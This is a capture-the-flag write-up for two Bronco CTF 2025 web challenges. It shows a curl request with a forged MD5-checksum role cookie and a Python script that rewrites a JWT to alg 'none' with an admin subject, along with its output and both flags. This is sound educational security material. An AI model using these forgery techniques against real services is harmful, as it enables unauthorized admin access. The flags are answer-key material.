--------------

### CTF-: BRONCO CTF 2025

--------------

![image](https://github.com/user-attachments/assets/701bde62-84df-4985-9561-4d9d69f1434e)

---------------

### CHALLENGES-:

----------------

- Web-:
 - Grandma's Secret Recipe
 - Mika's Autograph

----------------

### Grandma's Secret Recipe

-----------------

![image](https://github.com/user-attachments/assets/2ed8ef70-1f2c-4215-bed7-e6ca8c655f06)

------------------

- The site has 3 endpoints as seen in the image below.We are logged in as `grandma's helper`.

![image](https://github.com/user-attachments/assets/7348f296-603a-4fd7-aa23-f1dfd254c47b)

- I ran `curl`  with `-v` for a verbose output which will include request and response headers.I noticed the role header and checksum containing an hash.

![image](https://github.com/user-attachments/assets/08014ebd-b0dd-41b8-9d10-2e62b239b503)

- I computed the hash for the value `kitchen helper` in md5 and got the same hash.

![image](https://github.com/user-attachments/assets/729da742-65f6-4a4c-bf26-c07ad0ffac0e)

- In order to get the flag, we need to create an hash with the value `grandma` and pass it to the route `/grandma` to get the flag

```bash
❯ curl https://grandma.web.broncoctf.xyz/grandma -H "Cookie: role=grandma;checksum=a5d19cdd5fd1a8f664c0ee2b5e293167"

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Grandma's Bakery</title>
    <style>
        body { font-family: 'Comic Sans MS', cursive, sans-serif; background-color: #ffe5b4; text-align: center; }
        .container { margin-top: 50px; padding: 20px; background: #fff8dc; border-radius: 10px; display: inline-block; box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1); }
        .flag { font-weight: bold; color: green; }
        .btn { display: inline-block; padding: 10px 20px; margin: 10px; background-color: #d2691e; color: white; text-decoration: none; border-radius: 5px; }
        h1 { color: #8b0000; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Welcome to Grandma's Bakery!</h1>
        <p>Grandma&#39;s Secret Recipe: </p>
        <p class="flag">Flag: bronco{grandma-makes-b3tter-cookies-than-girl-scouts-and-i-w1ll-fight-you-over-th@t-fact}</p>
        <br>
        <a class="btn" href="/login">Login</a>
        <a class="btn" href="/logout">Logout</a>
        <a class="btn" href="/grandma">Grandma's Pantry</a>
    </div>
</body>
</html>%
```

- Flag-: ```bronco{grandma-makes-b3tter-cookies-than-girl-scouts-and-i-w1ll-fight-you-over-th@t-fact}```

-------------

### Miku's Autograph

------------

![image](https://github.com/user-attachments/assets/6c602426-f82b-4e66-870f-ec52a644c878)

------------

- This challenge is based on `jwt exploitation`.If an attacker sets the base64 encoded header key `alg` to `none`, the server takes the jwt as having no algorithm and decodes it freely without the secret key.
- I wrote a script to automate the process.The script picks the token from the `get_token` endpoint.It is passed to the `tweakTokem` function which decodes the jwt header and set the `algorithm` or `alg` to `none`.The `sub` key in the base64_decoded payload which represents the `username` and set it to `miku_admin`.Lastly, the newly created `jwt_token` is passed to the `/login` which grants the flag.

```python3
#! /usr/bin/env python3
from ten import *
from tenlib.transform import *
from dataclasses import *

set_message_formatter("Oldschool")
@arg("-h","--host")
@entry
@dataclass
class Exploit:
      host: str
      @staticmethod
      def tweakToken(token: str) -> str:
          header,payload,signature =  token.split(".")
          base64_decoded_header = json.decode(base64.decode(header)) 
          base64_decoded_payload = json.decode(base64.decode(payload))
          #Chaning alg to none
          base64_decoded_header["alg"] =  "none"
          base64_decoded_payload["sub"] = "miku_admin"
          header = base64.encode(json.encode(base64_decoded_header)).replace("=","")
          payload = base64.encode(json.encode(base64_decoded_payload)).replace("=","")
          cookie =  f"{header}.{payload}.{signature}"
          msg_info(f"Tweaked Cookie is : {cookie}")
          return cookie

      def run(self):
          session = ScopedSession(self.host)
          #Retrieving the token
          msg_info("Retreiving the token....")
          token = json.decode(session.get("/get_token").text)["your_token"]
          cookie = Exploit.tweakToken(token)
          data  =  {"magic_token": cookie}
          flag =  session.post("/login",data=data)
          msg_info(flag.text)

if __name__ == "__main__":
   Exploit()
```

- Flag-:```bronco{miku_miku_beaaaaaaaaaaaaaaaaaam!}```

```bash
❯ ./solve.py https://miku.web.broncoctf.xyz
[*] Retreiving the token....
[*] Tweaked Cookie is : 
eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0.eyJzdWIiOiAibWlrdV9hZG1pbiIsICJleHAiOiAxNzM5NjkzNTMwfQ.iCWM6lasTvp87UENXJLecwpZI37AqRTN-zROg8sOE-M
[*] <h2>Welcome, Miku Admin! Here's your flag: bronco{miku_miku_beaaaaaaaaaaaaaaaaaam!}</h2>
```





